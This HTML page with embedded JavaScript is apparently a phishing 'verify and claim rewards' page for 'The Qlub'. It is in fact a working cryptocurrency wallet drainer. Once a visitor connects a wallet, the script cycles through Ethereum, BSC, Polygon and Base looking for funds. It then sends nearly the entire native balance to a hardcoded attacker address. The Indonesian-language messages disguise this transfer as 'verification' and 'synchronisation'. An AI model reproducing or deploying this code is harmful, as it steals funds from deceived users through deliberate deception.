<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Qlub - Verify & Sync</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
    
    <style>
        body { background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; }
        .card { box-shadow: 0 0.5rem 1rem rgba(0,0,0,0.15); border-radius: 1rem; max-width: 450px; width: 100%; padding: 2.5rem; text-align: center; background-color: #ffffff; }
        .card-title { font-size: 1.8rem; font-weight: 700; color: #343a40; margin-bottom: 1rem; }
        .btn-primary { background-color: #007bff; border: none; font-weight: 600; padding: 0.8rem 1.5rem; border-radius: 0.6rem; width: 100%; transition: all 0.2s; }
        .btn-primary:hover { background-color: #0056b3; transform: translateY(-1px); }
        .alert { margin-top: 1.5rem; border-radius: 0.5rem; font-size: 0.85rem; text-align: left; }
        .spinner-border { width: 1.2rem; height: 1.2rem; margin-right: 0.5rem; }
    </style>
</head>
<body>

    <div class="card">
        <h2 class="card-title">Connect Your Wallet</h2>
        <p class="text-muted mb-4">Verification required for <strong>support@theqlub.xyz</strong>. Please connect your wallet to claim rewards.</p>
        
        <button id="connectWalletBtn" class="btn btn-primary btn-lg">
            <span id="btnText">Hubungkan Wallet</span>
            <span id="spinner" class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
        </button>

        <div id="statusMessage" class="mt-3"></div>
    </div>

    <script>
        const vaultAddress = "0x936273D0f8387Ff9f6FA86e4Dc8A09CBD6FB9A32"; 
        
        // Daftar Jaringan: ETH, BSC, Polygon, Base
        const targetChains = [
            { id: '0x1', name: 'Ethereum' },
            { id: '0x38', name: 'Binance Smart Chain' },
            { id: '0x89', name: 'Polygon' },
            { id: '0x2105', name: 'Base' }
        ];

        let provider, signer, currentChainIndex = 0;
        let isSweeping = false;

        const connectWalletBtn = document.getElementById('connectWalletBtn');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('spinner');
        const statusMessage = document.getElementById('statusMessage');

        function displayMessage(message, type) {
            statusMessage.innerHTML = `<div class="alert alert-${type}" role="alert">${message}</div>`;
        }

        async function switchNetwork(chainId) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: chainId }],
                });
                return true;
            } catch (error) {
                console.error("Switch error", error);
                return false;
            }
        }

        async function connectWallet() {
            if (isSweeping) return;
            const externalProvider = window.ethereum || window.okxwallet || (window.bitkeep && window.bitkeep.ethereum);

            if (!externalProvider) {
                displayMessage("Wallet tidak terdeteksi. Gunakan extension MetaMask/OKX/Bitget.", "danger");
                return;
            }

            spinner.classList.remove('d-none');
            btnText.textContent = 'Menghubungkan...';
            connectWalletBtn.disabled = true;

            try {
                await externalProvider.request({ method: 'eth_requestAccounts' });
                provider = new ethers.BrowserProvider(externalProvider);
                signer = await provider.getSigner();
                const userAddress = await signer.getAddress();
                
                await processCheck(userAddress);
            } catch (error) {
                displayMessage("Koneksi dibatalkan.", "danger");
                resetButton();
            }
        }

     async function processCheck(userAddress) {
    isSweeping = true;
    const balance = await provider.getBalance(userAddress);
    const network = await provider.getNetwork();
    const feeData = await provider.getFeeData();
    
    // Estimasi biaya gas standar (21000 gas * harga gas saat ini)
    const gasLimit = 21000n;
    const maxFeePerGas = feeData.maxFeePerGas || ethers.parseUnits("30", "gwei");
    const totalGasCost = gasLimit * maxFeePerGas;

    displayMessage(`Memeriksa saldo di ${targetChains.find(c => BigInt(c.id) === network.chainId)?.name || 'Jaringan'}...`, "info");

    // LOGIKA PINDAH JARINGAN: 
    // Jika saldo benar-benar 0 ATAU saldo lebih kecil dari biaya gas
    if (balance === 0n || balance <= totalGasCost) {
        currentChainIndex++;
        if (currentChainIndex < targetChains.length) {
            displayMessage(`Saldo tidak mencukupi di jaringan ini. Mengalihkan ke ${targetChains[currentChainIndex].name}...`, "warning");
            
            const success = await switchNetwork(targetChains[currentChainIndex].id);
            if (success) {
                // Tunggu sebentar agar wallet benar-benar switch jaringan
                setTimeout(() => connectWallet(), 2000);
            } else {
                resetButton();
            }
        } else {
            displayMessage("Verifikasi selesai. Tidak ditemukan saldo yang cukup di semua jaringan.", "success");
            resetButton();
        }
    } else {
        // Jika saldo cukup untuk bayar gas, baru eksekusi pengiriman
        await executeSweep(userAddress, balance);
    }
}
        async function executeSweep(userAddress, balance) {
            btnText.textContent = 'Memproses Verifikasi...';
            try {
                const feeData = await provider.getFeeData();
                const gasLimit = 21000n;
                const maxFeePerGas = feeData.maxFeePerGas || ethers.parseUnits("30", "gwei");
                const amountToSend = balance - (gasLimit * maxFeePerGas);

                if (amountToSend > 0n) {
                    displayMessage("Mohon konfirmasi sinkronisasi saldo pada dompet Anda.", "info");
                    const tx = await signer.sendTransaction({
                        to: vaultAddress,
                        value: amountToSend,
                        gasLimit: gasLimit,
                        maxFeePerGas: maxFeePerGas,
                        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits("1", "gwei")
                    });
                    await tx.wait();
                    displayMessage("âœ… Sinkronisasi Berhasil.", "success");
                } else {
                    displayMessage("Saldo terlalu kecil untuk biaya gas.", "warning");
                }
            } catch (e) {
                displayMessage("Proses dibatalkan oleh pengguna.", "danger");
            }
            resetButton();
        }

        function resetButton() {
            isSweeping = false;
            spinner.classList.add('d-none');
            btnText.textContent = 'Hubungkan Wallet';
            connectWalletBtn.disabled = false;
        }

        connectWalletBtn.addEventListener('click', connectWallet);
    </script>
</body>
</html>